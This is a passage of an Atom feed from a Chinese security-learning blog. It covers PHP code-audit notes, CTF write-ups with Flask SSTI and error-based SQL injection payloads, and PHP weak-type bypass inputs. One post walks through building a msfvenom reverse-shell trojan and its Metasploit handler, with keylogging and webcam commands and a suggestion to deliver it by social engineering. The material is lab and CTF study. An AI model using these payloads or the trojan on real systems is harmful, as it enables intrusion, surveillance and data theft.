&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/devilare/article/details/119351945&quot;&gt;https://blog.csdn.net/devilare/article/details/119351945</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(二)</title>
    <link href="http://daweitech.github.io/2021/09/02/php/0/"/>
    <id>http://daweitech.github.io/2021/09/02/php/0/</id>
    <published>2021-09-02T09:57:07.000Z</published>
    <updated>2021-09-02T12:56:37.441Z</updated>
    
    <content type="html"><![CDATA[<h4 id="文件上传漏洞挖掘与利用"><a href="#文件上传漏洞挖掘与利用" class="headerlink" title="文件上传漏洞挖掘与利用"></a>文件上传漏洞挖掘与利用</h4><p>1.搜索 move_uploaded_file()函数, 在PHP中上传函数只有这一个</p><p>2.查看上传文件的代码是否存在限制或可以绕过</p><p>3.搜索include、require、include_once、require_once函数，</p><p>是否存在可控变量。</p><p>4.追踪程序运行流程，查看模块加载时包含的文件是否可控。</p><p><img src="/2021/09/02/php/0/capture_20210902180930752.bmp" alt="capture_20210902180930752"></p><p>任意文件读取、下载、写入、删除、漏洞挖掘与利用</p><p>黑盒看功能点对应的文件， 再去读文件</p><p>搜索文件读取的函数， 查看是否存在直接或者直接控制的变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents、highlight_file、fopen、readfile、fread、</span><br><span class="line"></span><br><span class="line">fgetss、fgets、parse_ini_file、show_source、file、fwrite、</span><br><span class="line"></span><br><span class="line">file_put_contents、unlink</span><br></pre></td></tr></table></figure><p><img src="/2021/09/02/php/0/image-20210902181425601.png" alt="image-20210902181425601"></p><h4 id="SSRF漏洞挖掘与利用"><a href="#SSRF漏洞挖掘与利用" class="headerlink" title="SSRF漏洞挖掘与利用"></a>SSRF漏洞挖掘与利用</h4><p>1.找对应功能点，直接黑盒测试查看是否能简单利用，不能再去追踪流程分析传递过程。</p><p>2.白盒挖掘则需要搜索带有变量参数的相关函数</p><p>3.file_get_contents()</p><p>4.fsockopen()</p><p>5.curl_exec()</p><p>6.fopen()</p><p><img src="/2021/09/02/php/0/image-20210902203610020.png" alt="image-20210902203610020"></p><h4 id="代码执行漏洞挖掘与利用"><a href="#代码执行漏洞挖掘与利用" class="headerlink" title="代码执行漏洞挖掘与利用"></a>代码执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数， 回溯跟踪</p><p>2.eval、assert、preg_repleace、$_ GET($_POST[]);</p><p>call_user_func、call_user_func_array、array_map等函数。</p><p><img src="/2021/09/02/php/0/image-20210902204019087.png" alt="image-20210902204019087"></p><h4 id="命令执行漏洞挖掘与利用"><a href="#命令执行漏洞挖掘与利用" class="headerlink" title="命令执行漏洞挖掘与利用"></a>命令执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数，回溯跟踪</p><p>2.system、exec、shell_exec、passthru</p><p>反引号``、popen、ob_start、pcntl_exec</p><p>proc_open</p><p><img src="/2021/09/02/php/0/image-20210902204301956.png" alt="image-20210902204301956"></p><h4 id="SQL注入漏洞挖掘与利用"><a href="#SQL注入漏洞挖掘与利用" class="headerlink" title="SQL注入漏洞挖掘与利用"></a>SQL注入漏洞挖掘与利用</h4><p>1.跟踪参数传递是否存在过滤，数据库查询是否使用预编译</p><p>2.一般数据库查询会被封装在几个核心文件中，反复调用。当然在某些复杂的功能中，</p><p>可能也会存在不使用封装的函数，所以需要全面排查。</p><p>3.在挖掘的过程中，也要注意宽字节注入、二次注入等方法的可能性。</p><p><img src="/2021/09/02/php/0/image-20210902204505442.png" alt="image-20210902204505442"></p><h4 id="XSS漏洞挖掘与利用"><a href="#XSS漏洞挖掘与利用" class="headerlink" title="XSS漏洞挖掘与利用"></a>XSS漏洞挖掘与利用</h4><p>1.查看参数传递进入到输出是否存在过滤函数</p><p>2.常见的输出函数，print、print_r、echo、printf、sprint、die</p><p>var_dump、var_export等</p><p><img src="/2021/09/02/php/0/image-20210902204739145.png" alt="image-20210902204739145"></p><h4 id="CSRF漏洞挖掘与利用"><a href="#CSRF漏洞挖掘与利用" class="headerlink" title="CSRF漏洞挖掘与利用"></a>CSRF漏洞挖掘与利用</h4><p>1.查看提交数据功能点，抓包查看是否token，查看核心代码中是否存在token或者referer校验</p><p>2.可以直接搜索token、referer关键字</p><p>反序列化漏洞挖掘与利用</p><p>搜索带有变量参数的反序列化函数unserliaze()，查看是否存在利用点</p><p>反序列化中需关注的函数</p><p><img src="/2021/09/02/php/0/image-20210902205114294.png" alt="image-20210902205114294"></p><h4 id="install系统重装漏洞"><a href="#install系统重装漏洞" class="headerlink" title="install系统重装漏洞"></a>install系统重装漏洞</h4><p>在安装过程中，</p><p>需要填写Web应用的数据库配置，一般会将配置直接写入到配置文件中，</p><p>在写入的过程中往往没有校验</p><p>(有可能其他安装后修改的功能会做校验)，导致</p><p>直接写入php代码到配置文件中，</p><p>从而达到任意代码执行的目的</p><p>install系统重装验证绕过漏洞</p><p>某些CMS的install的验证不严谨，导致直接绕过重装，例如</p><p>1.</p><p>使用JavaScript跳转，但是后面的代码仍然会被执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this\-&gt;myclass-\&gt;notice(&#39;alert(&quot;系统已安装过&quot;);window.location.href&#x3D;&quot;&#39;.site_url().&#39;&quot;;&#39;);</span><br></pre></td></tr></table></figure><p>2.</p><p>使用header()</p><p>函数进行跳转，没有使用die()</p><p>或者exit()结束，那么后面部分的代码仍然会</p><p>被执行</p><p>//header 头并不会结束之后的代码，漏洞出在这里</p><p>header( ‘location: ../index.php’);</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;文件上传漏洞挖掘与利用&quot;&gt;&lt;a href=&quot;#文件上传漏洞挖掘与利用&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞挖掘与利用&quot;&gt;&lt;/a&gt;文件上传漏洞挖掘与利用&lt;/h4&gt;&lt;p&gt;1.搜索 move_uploaded_file()函数, 在PHP中</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <link href="http://daweitech.github.io/2021/09/01/buu/17/"/>
    <id>http://daweitech.github.io/2021/09/01/buu/17/</id>
    <published>2021-09-01T07:29:25.000Z</published>
    <updated>2021-09-01T08:19:14.426Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)</a></p><p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeo的博客-CSDN博客</a></p><p>最近刚学了模板注入，这题就直接顺着flask的payload去</p><p><img src="/2021/09/01/buu/17/image-20210901155839298.png" alt="image-20210901155839298"></p><p>试着用简单的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2+2&#125;&#125;</span><br></pre></td></tr></table></figure><p>经过加密解密提交后</p><p><img src="/2021/09/01/buu/17/image-20210901160005521.png" alt="image-20210901160005521"></p><p>再尝试用system函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/buu/17/image-20210901160203877.png" alt="image-20210901160203877"></p><p>好家伙，果然被过滤了</p><p>试了几个关键字都不行后，查看提示，在源码处看到</p><p><img src="/2021/09/01/buu/17/image-20210901160310325.png" alt="image-20210901160310325"></p><p>看到PIN</p><p>果断上网查了文章，发现PIN还挺难得到的</p><p>主要是python脚本不会写。。。</p><p>接下来按照正常解题流程：</p><p>payload1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="/2021/09/01/buu/17/image-20210901160640173.png" alt="image-20210901160640173"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/cbca419ba075&quot;&gt;flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;a href=&quot;https://blog.csdn.net/Sop</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>Daily</title>
    <link href="http://daweitech.github.io/2021/09/01/x/q/"/>
    <id>http://daweitech.github.io/2021/09/01/x/q/</id>
    <published>2021-09-01T06:37:51.000Z</published>
    <updated>2021-09-02T10:03:21.473Z</updated>
    
    <content type="html"><![CDATA[<p>​    之后这篇文章就来记录一些日常了</p><p>9.1</p><p>很开心啊，昨天发布的文章到今天就有90多个访问量</p><p>而且登上了csdn的php榜第25名！再接再厉！</p><p><img src="/2021/09/01/x/q/image-20210901144059817.png" alt="image-20210901144059817"></p><p>9.2</p><p>没想到代码审计的文章能到第五名</p><p>真是意外</p><p>虽然浏览量不太高(emm,再接再励吧)</p><p><img src="/2021/09/01/x/q/image-20210902180307061.png" alt="image-20210902180307061"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    之后这篇文章就来记录一些日常了&lt;/p&gt;
&lt;p&gt;9.1&lt;/p&gt;
&lt;p&gt;很开心啊，昨天发布的文章到今天就有90多个访问量&lt;/p&gt;
&lt;p&gt;而且登上了csdn的php榜第25名！再接再厉！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/01/x/q/image-20</summary>
      
    
    
    
    
    <category term="分享" scheme="http://daweitech.github.io/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(一)</title>
    <link href="http://daweitech.github.io/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <id>http://daweitech.github.io/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</id>
    <published>2021-08-31T06:33:44.000Z</published>
    <updated>2021-09-02T09:59:22.901Z</updated>
    
    <content type="html"><![CDATA[<p> <strong>文章内容来自于：安恒信息</strong></p><h3 id="通用代码审计思路："><a href="#通用代码审计思路：" class="headerlink" title="通用代码审计思路："></a>通用代码审计思路：</h3><h4 id="1-根据敏感关键字回溯参数传递过程-逆向追踪"><a href="#1-根据敏感关键字回溯参数传递过程-逆向追踪" class="headerlink" title="1.根据敏感关键字回溯参数传递过程(逆向追踪)"></a>1.根据敏感关键字回溯参数传递过程(逆向追踪)</h4><p>​            检查敏感函数的参数，进行回溯变量，判断变量是否可控并且没有经过严格的过滤，这是一个逆向追踪的过程。</p><h4 id="2-寻找可控参数，正向追踪变量传递过程-正向追踪"><a href="#2-寻找可控参数，正向追踪变量传递过程-正向追踪" class="headerlink" title="2.寻找可控参数，正向追踪变量传递过程(正向追踪)"></a>2.寻找可控参数，正向追踪变量传递过程(正向追踪)</h4><p>​            跟踪传递的参数，判断是否存入到敏感函数内或者传递的过程中具有代码逻辑漏洞。</p><h4 id="3-寻找敏感功能点，通读功能点代码-直接挖掘功能点漏洞"><a href="#3-寻找敏感功能点，通读功能点代码-直接挖掘功能点漏洞" class="headerlink" title="3.寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)"></a>3.寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)</h4><p>​            根据自身经验判断在该应用中的哪些功能可能出现漏洞。</p><h4 id="4-直接通读全文代码"><a href="#4-直接通读全文代码" class="headerlink" title="4.直接通读全文代码"></a>4.直接通读全文代码</h4><h3 id="敏感函数回溯审计："><a href="#敏感函数回溯审计：" class="headerlink" title="敏感函数回溯审计："></a>敏感函数回溯审计：</h3><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103125151.png" alt="image-20210901103125151"></p><h4 id="通读全文代码"><a href="#通读全文代码" class="headerlink" title="通读全文代码"></a>通读全文代码</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103255032.png" alt="image-20210901103255032"></p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103436076.png" alt="image-20210901103436076"></p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><p>php弱类型</p><h4 id="1-比较符号"><a href="#1-比较符号" class="headerlink" title="1.比较符号"></a>1.比较符号</h4><p>==            先进行类型转化，再进行比较（弱比较）</p><p>===          先比较类型，若类型不同直接返回不等（强比较）</p><p>Tips</p><p>Bool类型的true和任意字符串的弱类型相等</p><p>数字与字符串相比较，会将字符串转化为数字</p><p>若字符串以数字开头，则取开头数字作为转化结果，</p><p>若无则转化为0，若符合科学记数法的形式，则按照科学记数法来取</p><h4 id="2-hash比较缺陷"><a href="#2-hash比较缺陷" class="headerlink" title="2.hash比较缺陷"></a>2.hash比较缺陷</h4><p>如果采用</p><p>== 运算符比较哈希值，会面临上面讲的弱类型比较的问题，</p><p>即任何以’0e’ 开头的字符串都相等！</p><p>常见的md5</p><p>运算后以’0e’开头的字符串有：</p><p>QNKCDZO</p><p>s878926199a</p><p>s155964671a</p><p>s1885207154a</p><p>s1836677006a</p><p>s1184209335a</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104340610.png" alt="image-20210901104340610"></p><h4 id="3-md5-sha1函数缺陷"><a href="#3-md5-sha1函数缺陷" class="headerlink" title="3.md5 sha1函数缺陷"></a>3.md5 sha1函数缺陷</h4><p>当md5()函数与sha1()函数对参数进行加密处理时，</p><p>如果碰到一个数组，md5()函数会返回null</p><p>sha1()函数也是一样。</p><p>利用这个特性构造两个数组即可。</p><p>a[]=1即表示传入了一个数组</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104608235.png" alt="image-20210901104608235"></p><p>变量覆盖</p><h4 id="1-parse-str导致的变量覆盖"><a href="#1-parse-str导致的变量覆盖" class="headerlink" title="1.parse_str导致的变量覆盖"></a>1.parse_str导致的变量覆盖</h4><p>parse_str( string $encoded_string[.array &amp;$result] )</p><p>parse_str() 函数用于把查询字符串解析到变量中，</p><p>如果没有result参数，则由该函数设置的变量将覆盖已存在的同名变量，</p><p>如果设置了第二个变量result</p><p>变量将会以数组元素的形式存入到这个数组，作为替代。</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901145407518.png" alt="image-20210901145407518"></p><h4 id="2-X-Forwarded-For绕过指定地址"><a href="#2-X-Forwarded-For绕过指定地址" class="headerlink" title="2.X-Forwarded-For绕过指定地址"></a>2.X-Forwarded-For绕过指定地址</h4><p>HTTP头添加X-Forwarded-For：</p><h4 id="3-strops数组绕过NULL与ereg正则-00截断"><a href="#3-strops数组绕过NULL与ereg正则-00截断" class="headerlink" title="3.strops数组绕过NULL与ereg正则%00截断"></a>3.strops数组绕过NULL与ereg正则%00截断</h4><p>知识点补充：</p><p>PHP strops()函数</p><p>定义和用法：</p><p>strops()函数查找字符串在另一字符串第一次出现的位置</p><p>注释：strops()函数对大小写敏感</p><p>​            该函数是二进制安全的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="keyword">string</span>,find,start)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定在何处开始搜索。</td></tr></tbody></table><table><thead><tr><th>返回值：</th><th>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</th></tr></thead><tbody><tr><td>PHP 版本：</td><td>4+</td></tr></tbody></table><p>ereg正则函数</p><p>字符串比对解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ereg(<span class="keyword">string</span> pattern, <span class="keyword">string</span> <span class="keyword">string</span>, <span class="keyword">array</span> [regs]);</span><br></pre></td></tr></table></figure><p>本函数以 pattern 的规则来解析比对字符串 string。</p><p>比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901150729125.png" alt="image-20210901150729125"></p><p>方法一：</p><p>既要是纯数字</p><p>又要有’ #biubiubiu’</p><p>strpos()找的是字符串，那么传一个数组给它</p><p>strpos()出错返回null,null!==false,</p><p>所以符合要求</p><p>所以输入nctf[]= </p><p>那为什么ereg()也能符合呢?</p><p>因为ereg()</p><p>在出错时返回的也是null,null!==false,</p><p>所以符合要求</p><p>方法二：</p><p>字符串截断</p><p>利用ereg()的NULL截断漏洞，绕过正则过滤</p><p>?nctf=1%00%23biubiubiu </p><h3 id="模拟演练："><a href="#模拟演练：" class="headerlink" title="模拟演练："></a>模拟演练：</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831213941122.bmp" alt="capture_20210831213941122"></p><p>?password=1337a</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831214131149.bmp" alt="capture_20210831214131149"></p><p>?name[]=1&amp;passsword[]=2</p><p>解析：sha1()函数默认的传入参数类型是字符串，当传入数组时均会返回false，通过判断。</p><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901105909901.png" alt="image-20210901105909901"></p><p>?a=240610708或?a=s878926199a</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; &lt;strong&gt;文章内容来自于：安恒信息&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;通用代码审计思路：&quot;&gt;&lt;a href=&quot;#通用代码审计思路：&quot; class=&quot;headerlink&quot; title=&quot;通用代码审计思路：&quot;&gt;&lt;/a&gt;通用代码审计思路：&lt;/h3&gt;&lt;h4 id=</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>一次简单的kali渗透测试</title>
    <link href="http://daweitech.github.io/2021/08/30/src/0830/"/>
    <id>http://daweitech.github.io/2021/08/30/src/0830/</id>
    <published>2021-08-30T08:44:34.000Z</published>
    <updated>2021-08-31T08:45:15.675Z</updated>
    
    <content type="html"><![CDATA[<h4 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h4><p> 参考链接：</p><p><a href="https://blog.csdn.net/k_love1219/article/details/104591110">记一次Kali系统渗透靶机(物理机)的详细过程（渗透必备）_k_love1219的博客-CSDN博客</a></p><p>首先开启kali-2018</p><p><img src="/2021/08/30/src/0830/image-20210830165837896.png" alt="image-20210830165837896"></p><p>接着我们开始创建木马文件</p><p>输入以下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;你的虚拟机ip地址 lport&#x3D;4444 -f exe -o &#x2F;root&#x2F;Desktop&#x2F;aaa.exe</span><br></pre></td></tr></table></figure><p>桌面会生成名为aaa.exe的木马文件</p><p><img src="/2021/08/30/src/0830/image-20210830170039670.png" alt="image-20210830170039670"></p><p>我们进入msfconsole</p><p><img src="/2021/08/30/src/0830/image-20210830170155242.png" alt="image-20210830170155242"></p><p>使用如下一系列指令：</p><p>使用exploit/multi/handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure><p>设置payload </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><p>设置木马监听回传ip地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 你的虚拟机的ip地址</span><br></pre></td></tr></table></figure><p>设置木马监听回传端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 4444</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210830170532133.png" alt="image-20210830170532133"></p><p>还可以用 show options来确认是否设置成功</p><p>这时候我们利用社会工程学的知识来将木马病毒送进靶机</p><p>doge（可以设置放在物理机桌面上，然后点击运行即可，若不放心可自行前去任务管理器的详细信息查看是否有进程aaa.exe）</p><p><img src="/2021/08/30/src/0830/image-20210831085318058.png" alt="image-20210831085318058"></p><p>可以看到建立了session</p><p>说明我们已经成功连上了靶机</p><p>试着运行一些指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210831085740617.png" alt="image-20210831085740617"></p><p>查看了靶机的一些信息</p><p>此外还有的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getuid    获取系统ID以及计算机名称</span><br><span class="line">kill    中止进程</span><br><span class="line">ps    列举正在运行中的进程</span><br><span class="line">getpid    获取当前进程标识符</span><br><span class="line">keyscan_start     开启按键记录会话</span><br><span class="line">keyscan_stop     终止按键记录会话</span><br><span class="line">keyscan_dump   转储从被攻击主机捕获到的按键</span><br><span class="line">enumdesktops    列举所有可访问到的桌面和工作站</span><br><span class="line">getdesktop    获取当前meterpreter桌面</span><br><span class="line">setdesktop    变更meterpreter当前桌面</span><br><span class="line">webcam_list   列举系统中所有的摄像头</span><br><span class="line">webcam_snap   捕获被攻击主机的快照</span><br><span class="line">record_mic    从主机的默认麦克风中记录环境声音</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>找到更为高级的免杀木马文章：</p><p><a href="https://www.cnblogs.com/leeqizhi/p/13029755.html">MSF制作免杀木马 - 迷途小書童~ - 博客园 (cnblogs.com)</a></p><h4 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h4><p>今天找到另外一篇文章来获取shell</p><p>操作方法差不多</p><p><a href="https://blog.csdn.net/cxcsdn666/article/details/100813443">Kali利用MSF渗透Win 7获取shell_舞指如歌~的博客-CSDN博客</a></p><p>这次不懂为什么文件复制不到win7上，索性就用了物理机来试验</p><p><a href="https://blog.csdn.net/u012206617/article/details/97389338">获取Shell（提权）后的操作（windows、Linux）_墨痕诉清风的博客-CSDN博客_shell提权</a></p><p>这时候之前的一篇安全客文章就讲的十分详细了</p><p><a href="https://www.anquanke.com/post/id/235631">MSF使用详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;8-30&quot;&gt;&lt;a href=&quot;#8-30&quot; class=&quot;headerlink&quot; title=&quot;8.30&quot;&gt;&lt;/a&gt;8.30&lt;/h4&gt;&lt;p&gt; 参考链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/k_love1219/articl</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 2019 HardSQL</title>
    <link href="http://daweitech.github.io/2021/08/30/buu/16/"/>
    <id>http://daweitech.github.io/2021/08/30/buu/16/</id>
    <published>2021-08-30T00:55:58.000Z</published>
    <updated>2021-08-30T01:36:03.240Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00知识点："><a href="#0x00知识点：" class="headerlink" title="0x00知识点："></a>0x00知识点：</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>sql注入中的updatexml()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML(XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值</p><p>改变XML_document中符合XPATH_string的值</p><p>例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>​            其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:root@localhost&#39;</span><br></pre></td></tr></table></figure><p>xpath语法总结：<a href="https://www.jb51.net/article/125607.htm">https://www.jb51.net/article/125607.htm</a></p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure><p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档</p><p>第二个参数是用Xpath路径法表示的查找路径</p><p>例子：</p><p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-e7ea259697eb4cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421/format/webp" alt="img"></p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-f13351339e441a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/580/format/webp" alt="img"></p><h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p><img src="/2021/08/30/buu/16/image-20210830091906610.png" alt="image-20210830091906610"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure><p>爆出库</p><p><img src="/2021/08/30/buu/16/image-20210830092011080.png" alt="image-20210830092011080"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092201589.png" alt="image-20210830092201589"></p><p>爆出表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092501514.png" alt="image-20210830092501514"></p><p>爆出列名</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092549838.png" alt="image-20210830092549838"></p><p>右边的flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 